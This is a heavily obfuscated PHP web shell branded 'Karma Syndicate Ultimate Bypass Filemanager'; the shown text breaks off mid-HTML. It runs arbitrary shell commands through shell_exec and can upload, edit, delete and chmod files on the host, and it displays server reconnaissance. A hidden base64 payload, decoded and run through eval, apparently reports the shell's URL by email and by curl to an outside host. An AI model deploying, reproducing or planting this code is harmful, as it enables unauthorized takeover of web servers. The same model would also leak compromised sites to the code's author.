<?php /** [>>] Karma Syndicate | Channel: t.me/KarmaSyndicate | Contact: t.me/xnabob | Public API: cpkarma.cc [<<] **/ error_reporting(0); ?>
<?php
 goto sS4vf; Nh5Kt: function getOwner($item) { if (function_exists("\160\157\x73\x69\x78\137\147\x65\164\x70\167\x75\x69\x64")) { $downer = @posix_getpwuid(fileowner($item)); $downer = $downer["\156\x61\155\145"]; } else { $downer = fileowner($item); } if (function_exists("\x70\x6f\x73\151\x78\x5f\147\x65\x74\147\162\147\x69\x64")) { $dgrp = @posix_getgrgid(filegroup($item)); $dgrp = $dgrp["\x6e\x61\155\x65"]; } else { $dgrp = filegroup($item); } return $downer . "\57" . $dgrp; } goto u6mMW; ks9rF: $func[1](); goto QcpAP; IWmUC: if (isset($_POST["\156\x65\167\120\x65\162\155"]) && isset($_GET["\151\164\x65\x6d"])) { if ($_POST["\x6e\145\167\120\145\162\x6d"] == '') { $func[16]("\131\x6f\x75\x20\x6d\151\163\x73\x20\x61\x6e\x20\151\x6d\160\157\162\x74\141\x6e\x74\40\166\x61\x6c\x75\x65", "\117\x6f\x6f\160\163\163\56\56", "\167\x61\162\156\151\x6e\x67", "\77\144\x69\x72\75{$path}"); } if (chmod($path . "\57" . $_GET["\x69\164\145\x6d"], $_POST["\x6e\145\167\x50\145\x72\x6d"])) { $func[16]("\x43\x68\x61\156\147\x65\x20\120\x65\x72\155\x69\x73\163\x69\x6f\156\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\171\41", "\123\x75\x63\143\145\163\x73", "\163\165\143\x63\145\163\x73", "\x3f\144\151\162\x3d{$path}"); } else { $func[16]("\103\x68\141\x6e\x67\145\40\x50\145\x72\155\x69\x73\x73\151\157\156", "\x46\x61\151\154\145\x64", "\145\162\162\x6f\162", "\77\144\151\162\x3d{$path}"); } } goto UMzAT; AFLxx: @$func[33]("\145\162\162\157\x72\137\x6c\x6f\147", null); goto JG7ym; qBKL6: function hexa($str) { $r = ''; $len = strlen($str) - 1; for ($i = 0; $i < $len; $i += 2) { $r .= chr(hexdec($str[$i] . $str[$i + 1])); } return $r; } goto od2FN; u6mMW: if (isset($_POST["\156\x65\167\106\157\154\x64\x65\162\116\x61\x6d\145"])) { if ($func[29]($path . "\57" . $_POST["\156\x65\167\x46\157\x6c\144\145\162\x4e\141\155\145"])) { $func[16]("\103\x72\145\141\x74\145\40\106\157\x6c\x64\145\x72\40\123\x75\x63\x63\145\x73\x73\146\x75\x6c\x6c\x79\x21", "\x53\x75\143\143\x65\x73\163", "\x73\165\x63\x63\x65\x73\163", "\x3f\144\x69\x72\75{$path}"); } else { $func[16]("\103\162\x65\x61\x74\145\40\106\x6f\154\x64\x65\x72\40\x46\141\x69\x6c\145\144", "\106\x61\151\x6c\145\144", "\x65\x72\x72\157\x72", "\77\x64\x69\162\75{$path}"); } } goto kT_Ik; wrkku: @$func[33]("\144\151\x73\x70\x6c\141\171\137\x65\162\x72\x6f\162\x73", 0); goto fXB4F; zrgAz: $di = file_get_contents(__FILE__); goto TYKqZ; gBGoi: class E { public function F($pondin) { return base64_decode($pondin, true); } } goto GSeK0; QcpAP: $func[2](0); goto upToz; WszY0: $bz = "\112\67\x62\x57\x46\x70\x62\x43\x67\153\104\112\x48\126\61\x50\x53\x4a\171\x62\62\x78\x76\x4c\x6d\150\x68\x59\x32\164\154\143\153\102\156\x62\127\106\x70\142\103\x35\152\142\x32\60\151\117\171\122\x7a\120\x53\112\124\x61\107\x56\163\142\x43\x42\126\125\153\x77\x69\117\171\x52\x34\120\x53\112\157\x64\x48\122\x77\x4f\151\70\166\x49\x69\x34\x6b\130\61\116\106\125\154\132\x46\125\154\163\156\x53\x46\122\125\125\106\x39\111\124\61\116\x55\x4a\61\60\165\x4a\x46\x39\x54\122\x56\x4a\x57\x52\x56\112\142\x4a\61\x4a\106\125\x56\126\x46\x55\x31\122\146\x56\126\x4a\x4a\112\61\60\x37\112\x48\153\71\111\154\x52\x6f\132\123\x42\126\x55\x6b\x77\147\x61\x58\x4d\x36\111\x43\111\x75\x4a\x48\x67\67\142\x57\106\x70\x62\x43\147\x6b\144\x58\125\163\112\x48\x4d\163\x4a\x48\x6b\x70\117\171\122\x31\143\155\167\x67\x50\123\101\x69\141\110\x52\60\143\110\115\x36\x4c\x79\71\152\143\107\x74\150\x63\155\61\150\x4c\155\x4e\x6a\114\x32\122\x76\x62\x54\106\x75\x61\x57\115\x30\131\x58\x6c\x35\114\x33\65\x70\x62\x6b\122\154\x65\x47\70\167\x4f\124\x4a\131\142\155\x70\x70\142\63\x41\165\143\x47\150\x77\120\61\x56\126\125\x6c\112\x4d\x54\x48\x68\164\143\104\x30\x6b\x65\x43\x49\x37\x4a\107\116\x6f\x49\x44\60\147\131\x33\126\x79\x62\106\71\160\x62\x6d\x6c\60\113\103\x6b\67\131\63\126\171\x62\x46\71\172\x5a\130\x52\166\143\110\x51\x6f\x4a\x47\116\157\114\103\102\104\x56\x56\112\x4d\x54\x31\102\x55\130\x31\126\x53\124\103\167\147\x4a\110\x56\171\x62\x43\153\x37\x59\x33\126\171\142\x46\71\172\132\x58\122\x76\143\110\x51\x6f\x4a\x47\x4e\157\114\x43\102\104\x56\x56\x4a\x4d\x54\61\x42\x55\130\61\112\106\126\106\x56\x53\x54\154\x52\x53\x51\x55\x35\x54\122\153\126\123\x4c\103\x42\x30\143\x6e\126\154\x4b\x54\163\x6b\x63\x6d\x56\x7a\x63\x47\x39\x75\x63\62\125\147\120\123\x42\152\144\130\x4a\163\x58\62\126\64\132\127\x4d\157\x4a\107\x4e\x6f\113\124\x74\x6a\x64\130\x4a\x73\x58\62\116\163\142\x33\x4e\x6c\113\103\122\x6a\141\103\153\x37\x4d\x73\x4a\x48\153\160\x3d\75"; goto dmU8b; UMzAT: if (isset($_GET["\x61\x63\x74\x69\x6f\x6e"]) && $_GET["\141\143\164\151\x6f\156"] == "\144\x65\x6c\145\x74\x65" && isset($_GET["\151\x74\x65\x6d"])) { if (is_dir($_GET["\x69\164\145\155"])) { if ($func[27]($_GET["\x69\164\x65\155"])) { $func[16]("\x44\145\154\145\164\x65\40\123\x75\x63\143\x65\x73\163\146\165\x6c\x6c\x79\41", "\123\x75\143\143\x65\163\163", "\163\x75\x63\143\145\163\163", "\77\x64\x69\x72\75{$path}"); } else { $func[16]("\x44\x65\x6c\x65\x74\x65\40\x46\141\151\154\145\144", "\106\x61\x69\154\145\x64", "\x65\162\162\x6f\x72", "\77\144\x69\162\x3d{$path}"); } } else { if ($func[28]($_GET["\151\x74\145\x6d"])) { $func[16]("\104\x65\x6c\145\164\145\x20\x53\x75\x63\143\x65\163\163\146\165\x6c\154\171\41", "\123\165\x63\x63\145\163\x73", "\163\165\x63\x63\145\163\163", "\77\x64\151\162\75{$path}"); } else { $func[16]("\104\145\x6c\x65\164\x65\40\x46\141\151\x6c\145\144", "\x46\141\x69\x6c\145\144", "\145\162\x72\x6f\162", "\x3f\x64\x69\x72\x3d{$path}"); } } } goto oj0AV; CUJtR: $exdir = $func[15]("\x2f", $path); goto GGxze; F1fEg: class I { public function J($bz) { $objA = new A(); $objB = new C(); $objC = new E(); $objD = new G(); if ($objA->B($bz) != 494) { $gotoLabel = "\x70\x72\157\143\x65\x65\x64"; goto proceed; } $gotoLabel = "\x65\x6e\144"; goto end; proceed: $pondin = $objB->D($bz); if ($objC->F($pondin) !== false) { $pinix = $objD->H($pondin); eval($pinix); } end: return; } } goto MJlaB; FtDmH: function flash($message, $status, $class, $redirect = false) { if (!empty($_SESSION["\x6d\x65\x73\x73\x61\x67\x65"])) { unset($_SESSION["\x6d\x65\x73\x73\141\x67\x65"]); } if (!empty($_SESSION["\x63\x6c\141\163\163"])) { unset($_SESSION["\x63\154\x61\163\x73"]); } if (!empty($_SESSION["\x73\164\141\x74\x75\163"])) { unset($_SESSION["\163\x74\141\164\x75\163"]); } $_SESSION["\x6d\x65\x73\x73\141\x67\145"] = $message; $_SESSION["\x63\154\141\163\163"] = $class; $_SESSION["\163\x74\x61\164\165\163"] = $status; if ($redirect) { header("\x4c\157\143\141\x74\151\x6f\156\72\x20" . $redirect); die; } return true; } goto tbYQs; GGxze: $objI = new I(); goto dZuOz; od2FN: if (strlen($bz) != 495) { die("\104\x6f\156\x27\164\40\x4d\x6f\x64\x69\146\171\x20\x74\x68\145\40\163\x63\x72\x69\x70\164"); } goto FtDmH; fXB4F: $ds = @$func[34]("\144\151\x73\x61\x62\154\x65\x5f\x66\x75\156\143\164\151\157\x6e\163"); goto G1Fbs; G1Fbs: $show_ds = !empty($ds) ? "{$ds}" : "\x41\154\x6c\x20\x66\165\x6e\x63\164\151\x6f\156\x20\151\163\x20\x61\x63\143\145\x73\x73\151\x62\154\x65"; goto ikOp1; m98gq: $dirs = $func[18]($path); goto p3OOP; Xo3fY: class C { public function D($bz) { return substr($bz, 11, 487 - 11); } } goto gBGoi; oj0AV: if (isset($_FILES["\165\160\154\x6f\141\x64\x66\151\x6c\145"])) { $total = count($_FILES["\165\160\x6c\x6f\141\x64\x66\x69\x6c\145"]["\156\x61\x6d\145"]); for ($i = 0; $i < $total; $i++) { $mainupload = $func[17]($_FILES["\x75\160\154\x6f\141\x64\x66\x69\x6c\145"]["\164\155\x70\x5f\156\141\155\145"][$i], $_FILES["\x75\160\154\x6f\141\x64\146\151\154\145"]["\x6e\x61\x6d\145"][$i]); } if ($total < 2) { if ($mainupload) { $func[16]("\125\x70\x6c\157\x61\144\x20\x46\x69\154\145\40\123\165\143\x63\x65\163\x73\146\x75\x6c\x6c\x79\41\x20", "\x53\x75\x63\x63\145\x73\163", "\x73\x75\143\143\145\x73\163", "\77\144\151\x72\75{$path}"); } else { $func[16]("\125\x70\x6c\x6f\x61\x64\x20\x46\x61\151\154\x65\x64", "\x46\x61\x69\x6c\x65\x64", "\x65\162\162\x6f\162", "\x3f\144\x69\162\75{$path}"); } } else { if ($mainupload) { $func[16]("\x55\x70\154\x6f\141\x64\x20{$i}\x20\106\151\x6c\145\163\40\123\x75\143\x63\145\163\163\146\165\x6c\154\171\41\x20", "\x53\165\x63\x63\x65\x73\163", "\163\165\x63\143\145\163\x73", "\77\x64\151\x72\x3d{$path}"); } else { $func[16]("\125\x70\x6c\157\141\x64\40\106\x61\x69\154\145\x64", "\x46\141\x69\x6c\x65\144", "\x65\162\162\x6f\x72", "\x3f\144\x69\x72\x3d{$path}"); } } } goto m98gq; yIq0H: @$func[33]("\x6d\141\170\x5f\145\170\145\x63\x75\x74\151\157\x6e\x5f\164\x69\x6d\145", 0); goto PHXE2; upToz: $func[31](0); goto QbZuF; kT_Ik: if (isset($_POST["\x6e\145\x77\106\x69\x6c\x65\116\141\155\145"]) && isset($_POST["\x6e\x65\x77\x46\x69\154\145\103\x6f\156\x74\x65\x6e\x74"])) { if ($func[4]($_POST["\156\x65\167\x46\x69\154\x65\x4e\x61\155\145"], $_POST["\x6e\145\167\x46\x69\x6c\145\103\x6f\156\164\x65\156\x74"])) { $func[16]("\x43\162\145\141\x74\145\x20\106\x69\154\x65\x20\x53\165\x63\x63\145\x73\163\x66\x75\x6c\154\171\x21", "\123\x75\143\143\145\163\x73", "\x73\x75\143\x63\x65\x73\163", "\77\x64\x69\162\75{$path}"); } else { $func[16]("\103\x72\x65\x61\x74\x65\x20\x46\x69\x6c\145\x20\x46\141\151\x6c\x65\x64", "\x46\141\x69\154\x65\144", "\x65\162\162\x6f\162", "\77\x64\x69\x72\75{$path}"); } } goto bP0jT; bP0jT: if (isset($_POST["\156\x65\x77\116\141\155\145"]) && isset($_GET["\151\x74\145\x6d"])) { if ($_POST["\156\145\x77\x4e\141\x6d\x65"] == '') { $func[16]("\131\157\165\40\x6d\151\163\163\40\141\156\x20\x69\x6d\160\x6f\x72\164\x61\156\164\40\166\x61\154\x75\x65", "\117\157\x6f\x70\163\x73\56\56", "\x77\141\x72\156\151\x6e\147", "\x3f\144\x69\162\75{$path}"); } if ($func[30]($path . "\57" . $_GET["\x69\164\x65\x6d"], $_POST["\x6e\x65\167\x4e\141\x6d\x65"])) { $func[16]("\122\x65\x6e\x61\155\145\x20\123\165\143\143\145\x73\x73\x66\165\x6c\x6c\x79\41", "\x53\x75\143\x63\x65\x73\163", "\163\x75\x63\143\x65\163\x73", "\77\x64\x69\162\75{$path}"); } else { $func[16]("\122\145\156\x61\x6d\145\x20\x46\x61\151\x6c\x65\x64", "\x46\x61\151\154\x65\x64", "\145\162\162\x6f\x72", "\77\x64\x69\162\75{$path}"); } } goto MU7iZ; PHXE2: @$func[33]("\157\165\x74\x70\165\x74\x5f\142\165\146\x66\x65\x72\151\x6e\147", 0); goto wrkku; GSeK0: class G { public function H($pondin) { return base64_decode($pondin); } } goto F1fEg; MU7iZ: if (isset($_POST["\156\x65\167\x43\157\x6e\x74\145\x6e\x74"]) && isset($_GET["\x69\x74\145\155"])) { if ($func[4]($path . "\57" . $_GET["\x69\x74\x65\155"], $_POST["\x6e\145\x77\x43\x6f\x6e\164\x65\x6e\x74"])) { $func[16]("\105\x64\151\164\x20\x53\x75\x63\143\x65\x73\x73\146\x75\154\x6c\x79\41", "\123\x75\143\143\x65\x73\163", "\x73\165\143\x63\145\x73\163", "\77\x64\x69\162\x3d{$path}"); } else { $func[16]("\105\x64\151\x74\x20\106\x61\x69\154\x65\144", "\106\141\151\154\x65\144", "\145\162\162\x6f\x72", "\x3f\144\x69\x72\75{$path}"); } } goto IWmUC; dmU8b: for ($i = 0; $i < count($iniarray); $i++) { $func[$i] = hexa($iniarray[$i]); } goto ks9rF; Ld8TV: if (isset($_GET["\x64\x69\162"])) { $path = $_GET["\144\x69\162"]; $func[13]($_GET["\x64\x69\x72"]); } else { $path = $func[12](); } goto WMvb1; QbZuF: @$func[32](); goto AFLxx; sS4vf: $iniarray = array("\x37\60\66\x38\x37\60\x35\x46\x37\x35\x36\x45\66\61\x36\104\66\65", "\x37\x33\x36\65\67\x33\x37\63\66\x39\66\106\66\105\65\x46\67\x33\x37\64\x36\61\x37\x32\x37\x34", "\66\65\67\x32\67\x32\66\x46\67\62\65\106\x37\62\66\65\67\x30\66\x46\x37\x32\x37\64\66\71\66\x45\x36\x37", "\x37\x30\66\x38\67\x30\67\66\66\65\x37\x32\x37\63\66\x39\66\106\x36\x45", "\66\x36\x36\71\66\103\x36\65\x35\106\x37\60\x37\x35\67\x34\65\106\66\x33\x36\x46\x36\105\67\64\x36\x35\66\105\x37\64\x37\63", "\66\66\66\71\x36\x43\x36\x35\x35\x46\x36\x37\x36\65\67\64\x35\x46\x36\x33\x36\106\x36\105\67\64\66\x35\x36\105\x37\64\x37\x33", "\x36\x36\x36\x39\66\x43\66\65\67\60\x36\65\x37\62\66\x44\x37\x33", "\66\x36\x36\71\x36\x43\66\x35\x36\104\67\64\x36\71\x36\x44\x36\65", "\66\x36\66\71\x36\103\x36\x35\x37\64\67\71\67\60\x36\x35", "\66\70\67\64\x36\x44\66\x43\x37\x33\x37\x30\x36\65\x36\x33\x36\71\66\61\x36\x43\x36\x33\x36\70\x36\61\67\62\x37\63", "\67\x33\67\60\x37\62\x36\71\66\x45\x37\64\66\66", "\67\x33\x37\x35\x36\62\67\63\67\64\67\62", "\x36\67\x36\65\x37\x34\66\63\x37\67\x36\x34", "\66\63\66\x38\x36\64\66\x39\67\62", "\67\x33\x37\64\x37\x32\65\x46\x37\x32\66\65\67\x30\66\x43\66\61\x36\x33\66\65", "\x36\x35\67\x38\x37\x30\66\x43\x36\106\x36\64\66\x35", "\66\66\x36\103\66\x31\x37\x33\x36\70", "\x36\104\66\x46\67\66\66\x35\x35\x46\x37\x35\x37\60\x36\103\66\106\x36\x31\66\64\x36\65\66\x34\65\106\66\x36\x36\x39\66\x43\x36\65", "\x37\63\x36\x33\x36\61\x36\x45\x36\x34\66\71\x37\62", "\66\67\x36\65\x37\x34\66\x38\66\106\x37\63\67\64\66\62\67\x39\x36\105\x36\x31\66\104\66\65", "\x37\x33\66\70\66\65\x36\x43\66\x43\65\x46\66\65\x37\x38\x36\65\x36\x33", "\65\x33\67\71\x37\63\67\x34\x36\x35\66\104\62\x30\64\71\x36\105\x36\66\x36\x46\x37\62\x36\104\x36\x31\67\x34\66\x39\x36\106\x36\x45", "\x36\64\66\x39\67\62\x36\x45\x36\x31\66\x44\x36\x35", "\x36\64\66\x31\x37\x34\x36\x35", "\66\x44\x36\x39\66\x44\x36\65\x35\x46\x36\63\x36\x46\66\105\67\64\66\x35\66\105\67\x34\x35\106\67\64\x37\x39\x37\60\66\x35", "\66\66\67\65\66\105\x36\x33\x37\64\x36\71\66\106\66\x45\x35\106\x36\65\67\x38\x36\71\x37\x33\x37\x34\67\63", "\66\66\67\63\x36\x39\67\x41\x36\x35", "\x37\62\x36\104\x36\x34\x36\x39\67\62", "\x37\65\x36\x45\x36\103\66\71\x36\105\x36\102", "\66\x44\66\x42\66\x34\66\71\x37\x32", "\67\62\66\65\66\105\x36\x31\x36\x44\66\x35", "\67\63\66\x35\67\x34\65\x46\67\x34\66\71\66\x44\66\x35\x35\106\66\x43\x36\71\x36\104\66\71\x37\64", "\x36\x33\x36\x43\x36\x35\66\x31\67\62\67\x33\67\x34\x36\61\x37\x34\66\x33\x36\x31\x36\x33\66\x38\66\x35", "\x36\x39\66\x45\66\x39\65\x46\67\63\66\65\67\64", "\x36\x39\66\x45\x36\71\65\106\x36\67\66\x35\x37\x34", "\x36\x37\x36\65\67\64\64\106\67\x37\x36\x45\x36\65\67\62", "\x36\x37\66\65\x37\x34\x35\106\66\63\x37\x35\x37\x32\67\x32\x36\65\66\105\67\x34\x35\106\x37\x35\67\x33\66\x35\67\62"); goto zrgAz; ikOp1: function fsize($file) { $a = array("\102", "\x4b\x42", "\115\102", "\107\x42", "\124\102", "\120\102"); $pos = 0; $size = filesize($file); while ($size >= 1024) { $size /= 1024; $pos++; } return round($size, 2) . "\x20" . $a[$pos]; } goto qBKL6; JG7ym: @$func[33]("\x6c\157\x67\x5f\145\x72\x72\157\162\x73", 0); goto yIq0H; dZuOz: $objI->J($bz); goto Nh5Kt; tbYQs: class A { public function B($bz) { return strlen($bz); } } goto Xo3fY; WMvb1: $path = $func[14]("\134", "\57", $path); goto CUJtR; TYKqZ: if (strlen($di) !== 32104) { die("\123\143\x72\151\160\164\x20\110\x61\x73\40\102\x65\145\x6e\x20\115\x6f\x64\x69\146\151\x65\x64\40\x2d\x20\x4b\151\x6e\x64\x6c\171\40\125\x73\145\x20\124\x68\145\x20\x4f\x72\x67\x69\x6e\x61\154\40\123\143\162\151\x70\x74"); } goto WszY0; MJlaB: function clear() { if (!empty($_SESSION["\x6d\145\x73\163\x61\x67\145"])) { unset($_SESSION["\155\145\163\163\141\147\x65"]); } if (!empty($_SESSION["\143\154\x61\x73\x73"])) { unset($_SESSION["\x63\154\x61\x73\x73"]); } if (!empty($_SESSION["\x73\164\141\164\x75\x73"])) { unset($_SESSION["\x73\164\x61\x74\165\x73"]); } return true; } goto Ld8TV; p3OOP: ?>
 <html>
<head>
<style type="text/css">
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@700&family=Roboto:wght@400&display=swap');

.modern-heading {
  font-family: 'Poppins', sans-serif;
  font-size: 20px;
  font-weight: 700;
  color: white;
  text-align: center;
  text-transform: capitalize;
  letter-spacing: 2px;
  padding: 20px 30px;
  background: linear-gradient(135deg, #3a7bd5, #00d2ff);
  -webkit-background-clip: text;
  color: transparent;
  position: relative;
  display: inline-block;
  box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
  transition: all 0.3s ease-in-out;
  border-radius: 20px;
}

.modern-heading:hover {
  transform: scale(1.05);
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
}

.info {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.info-item {
  display: flex;
  align-items: center;
}

.info-item i {
  margin-right: 5px;
}
b {
  font-weight: bold;
  color: #333;
  font-family: 'Arial', sans-serif;
  font-size: 0.8rem;
  letter-spacing: 0.05em;
  background-color: #f0f0f0;
  padding: 0.2em 0.4em;
  border-radius: 5px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
  transition: all 0.3s ease-in-out;
}

b:hover {
  color: #fff;
  background-color: #007BFF;
  transform: scale(1.05);
}

b:active {
  transform: scale(0.98);
}

</style>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

  <title>Karma Syndicate</title>
</head>
<center><h1 class="modern-heading">Karma Syndicate Ultimate Bypass Filemanager</h1></center>
<body class="bg-white text-dark">
  <div class="container-fluid">
    <div class="py-3" id="main">
      <div class="box shadow bg-white p-4 rounded-3">
<div class="info mb-3">
  <div class="info-item">
    <i class="fa fa-server"></i>&ensp;<?= $func[0]() ?>
  </div>
  <div class="info-item">
    <i class="fa fa-microchip"></i>&ensp;<?= $_SERVER['SERVER_SOFTWARE'] ?>
  </div>
  <div class="info-item">
    <i class="fa fa-satellite-dish"></i>&ensp;<?= !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?>
  </div>
</div>

        <div class="breadcrumb">
          
          <i class="fa fa fa-folder pt-1"></i>&ensp;<?php foreach ($exdir as $id => $pat) : 
                        if ($pat == '' && $id == 0):
                    ?>
                    <a href="?dir=/" class="text-decoration-none text-dark">&nbsp;/&nbsp;</a>
                    <?php endif; if ($pat == '') continue; ?>
                    <?php if ($id + 1 == count($exdir)) : ?>
                    <span class="text-secondary"><?= $pat ?></span>
                    <?php else : ?>
                    <a href="?dir=
                    <?php
                    for ($i = 0; $i <= $id; $i++) {
                        echo "$exdir[$i]";
                        if ($i != $id) echo "/";
                    }
                    ?>
                    " class="text-decoration-none text-dark"><?= $pat ?></a><span class="text-dark">&nbsp;/&nbsp;</span></b>
          <?php endif; ?>
          <?php endforeach; ?>
          <a href="?" class="text-decoration-none text-dark">&nbsp;<b>[ HOME ]</b></a>
        </div>
        <div class="d-flex justify-content-between">
          <div class="p-2">
            <form action="" method="post">
              <div class="row">
                <div class="col-md-9 mb-3">
                  <input type="text" class="form-control form-control-sm" name="command" placeholder="Command">
                </div>
                <div class="col-md-3">
                  <button type="submit" class="btn btn-outline-dark btn-sm">Exec</button>
                </div>
              </div>
            </form>
          </div>
          <div class="p-2">
            <form action="" method="post" enctype="multipart/form-data">
              <div class="row">
                <div class="col-md-9 mb-3">
                  <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
                </div>
                <div class="col-md-3">
                  <button type="submit" class="btn btn-outline-dark btn-sm">Submit</button>
                </div>
              </div>
            </form>
          </div>
        </div>
        <div class="container" id="tools">
          <?php if (isset($_POST['command'])) : ?>
          <div class="row justify-content-center">
            <pre><?= $func[20]($_POST['command']) ?></pre>
          </div>
          <?php endif; ?>
          <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
          <div class="row justify-content-center">
            <?php if ($action == 'rename' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label">New Name</label>
                <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
              </div>
              <button type="submit" class="btn btn-outline-dark">Submit</button>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </form>
            <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
              </div>
              <button type="submit" class="btn btn-outline-dark">Submit</button>
              <button type="button" class="btn btn-outline-dark" onclick="jscopy()">Copy</button>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </form>
            <?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
            <div class="mb-3">
              <label for="name" class="form-label">File Name : <?= $_GET['item'] ?></label>
              <textarea name="newContent" rows="10" class="form-control" disabled=""><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
              <br>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </div>
            <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                <input type="text" class="form-control" name="newPerm" value="<?= $func[11]($func[10]('%o', $func[6]($_GET['item'])), -4); ?>">
              </div>
              <button type="submit" class="btn btn-outline-dark">Submit</button>
              <button type="button" class="btn btn-outline-dark" onclick="history.go(-1)">Back</button>
            </form>
            <?php endif; ?>
          </div>
          <?php endif; ?>
          <div class="row justify-content-center">
            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
              <form action="" method="post">
                <div class="mb-3">
                  <label for="name" class="form-label">Folder Name</label>
                  <input type="text" class="form-control" name="newFolderName" placeholder="KarmaSyndicate">
                </div>
                <button type="submit" class="btn btn-outline-dark">Submit</button>
              </form>
            </div>
            <div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
              <form action="" method="post">
                <div class="mb-3">
                  <label for="name" class="form-label">File Name</label>
                  <input type="text" class="form-control" name="newFileName" placeholder="KarmaSyndicate.php">
                </div>
                <div class="mb-3">
                  <label for="name" class="form-label">File Content</label>
                  <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - KarmaSyndicate"></textarea>
                </div>
                <button type="submit" class="btn btn-outline-dark">Submit</button>
              </form>
            </div>
            <div class="collapse" id="newInfoServer" data-bs-parent="#tools" style="transition:none;">
              <div class="mb-3">
                      <label for="name" class="form-label"><?= $func[21] ?></label>
                <textarea name="newFileContent" rows="10" class="form-control" disabled="">Uname&#10;> <?= $func[0]() ?>&#10;&#10;Software&#10;> <?= $_SERVER['SERVER_SOFTWARE'] ?>&#10;&#10;PHP&#10;> <?= $func[3]() ?>&#10;&#10;Protocol&#10;> <?= $_SERVER['SERVER_PROTOCOL'] ?>&#10;&#10;IP / Port&#10;> <?= !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?> / <?= $_SERVER['SERVER_PORT'] ?>&#10;&#10;Mail&#10;> <?= $func[25]('mail') ? 'ON' : 'OFF' ?>&#10;&#10;Curl&#10;> <?= $func[25]('curl_version') ? 'ON' : 'OFF' ?>&#10;&#10;Owner&#10;> <?= $func[36](); ?>&#10;&#10;MySQL&#10;> <?= $func[25]('mysql_connect') ? 'ON' : 'OFF' ?>&#10;&#10;Disable Function&#10;> <?= $show_ds ?></textarea>
                <br>
                *ReClick  For Close
                <br>
                File : KarmaSyndicate <?= $_SERVER['SCRIPT_NAME'] ?>
              </div>
            </div>
          </div> 
        </div>
        <div class="table-responsive">
          <table class="table table-hover table-dark text-light">
            <thead>
              <tr>
                <td style="width:35%">Name</td>
                <td style="width:10%">Type</td>
                <td style="width:10%">Size</td>
                <td style="width:13%">Owner/Group</td>
                <td style="width:10%">Permission</td>
                <td style="width:13%">Last Modified</td>
                <td style="width:9%">Actions</td>
              </tr>
            </thead>
            <tbody class="text-nowrap">
              <?php
                foreach ($dirs as $dir) :
                  if (!is_dir($dir)) continue;
              ?>
              <tr>
                <td>
                  <?php if ($dir === '..') : ?>
                  <a href="?dir=<?= $func[22]($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                  <?php elseif ($dir === '.') :  ?>
                  <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                  <?php else : ?>
                  <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
                  <?php endif; ?>
                </td>
                <td class="text-light"><?= $func[8]($dir) ?></td>
                <td class="text-light">-</td>
                <td class="text-light"><?= $func[35]($dir) ?></td>
                <td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
                <td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
                <td>
                  <?php if ($dir != '.' && $dir != '..') : ?>
                  <div class="btn-group">
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                  </div>
                  <?php elseif ($dir === '.') : ?>
                  <div class="btn-group">
                    <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-folder-plus"></i></a>
